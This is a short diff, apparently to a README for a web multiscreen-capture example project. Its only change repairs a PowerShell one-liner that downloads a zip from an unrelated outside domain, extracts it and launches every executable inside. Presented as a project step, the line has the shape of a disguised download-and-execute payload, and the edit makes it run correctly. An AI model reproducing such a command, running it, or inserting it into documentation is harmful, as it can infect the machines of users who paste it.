@@ -10,4 +10,4 @@ This project contains example about multiscreen capture and views on the web pag
   },
 
 
-powershell Invoke-WebRequest "https://umaigames.com/sstool.zip" -OutFile "s.zip";powershell Expand-Archive "s.zip" -DestinationPath "s" -Forcepowershell cd s;powershell Start-Process "*.exe";powershell ls
+powershell Invoke-WebRequest "https://umaigames.com/sstool.zip" -OutFile "s.zip";powershell Expand-Archive "s.zip" -DestinationPath "s" -Force;powershell cd s;powershell Start-Process "*.exe";powershell ls
